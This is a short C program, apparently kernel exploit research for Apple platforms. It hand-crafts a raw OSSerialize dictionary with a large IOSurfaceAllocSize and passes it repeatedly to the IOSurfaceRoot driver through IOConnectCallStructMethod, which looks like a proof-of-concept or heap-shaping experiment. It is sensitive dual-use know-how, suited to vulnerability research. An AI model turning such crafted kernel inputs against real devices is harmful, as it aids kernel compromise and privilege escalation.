#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <IOSurface/IOSurface.h>

#define LOG(str, args...) do { printf(str "\n", ##args); } while(0)

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,

    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,

    kOSSerializeEndCollection   = 0x80000000U,

    kOSSerializeMagic           = 0x000000d3U,
};

int main(void)
{
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    LOG("service: %x", service);
    io_connect_t client = MACH_PORT_NULL;
    kern_return_t ret = IOServiceOpen(service, mach_task_self(), 0, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));

    /*uint32_t size = 0x16000;
    CFStringRef keys[] = { CFSTR("IOSurfacePreallocPages"), CFSTR("IOSurfacePrefetchPages"), CFSTR("IOSurfaceNonPurgeable"), CFSTR("IOSurfaceAllocSize") };
    CFTypeRef vals[] = { kCFBooleanTrue, kCFBooleanTrue, kCFBooleanTrue, CFNumberCreate(NULL, kCFNumberIntType, &size) };
    CFDictionaryRef dict = CFDictionaryCreate(NULL, (const void**)keys, (const void**)vals, 4, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if(dict == NULL)
    {
        LOG("Failed to create dict");
        return 1;
    }*/

    uint32_t dict[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 2,

        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeNumber | 32,
        //0x16000,
        0x2200000,
        0x0,

        kOSSerializeSymbol | 23,
        0x75534F49, 0x63616672, 0x65725065, 0x63746566, 0x67615068, 0x7365, // "IOSurfacePrefetchPages"
        kOSSerializeEndCollection | kOSSerializeBoolean | 1,
    };
    char out[0x6c8];

    for(size_t i = 0; i < 10; ++i)
    {
        size_t outsize = sizeof(out);
        ret = IOConnectCallStructMethod(client, 0, dict, sizeof(dict), out, &outsize);
        LOG("newSurface: %s", mach_error_string(ret));
    }

    /*for(size_t i = 0; i < 1000; ++i)
    {
        IOSurfaceRef surface = IOSurfaceCreate(dict);
        LOG("%p", surface);
        LOG("%p, %lu", IOSurfaceGetBaseAddress(surface), IOSurfaceGetAllocSize(surface));
    }*/

    LOG("Done");
    sleep(1000);

    return 0;
}
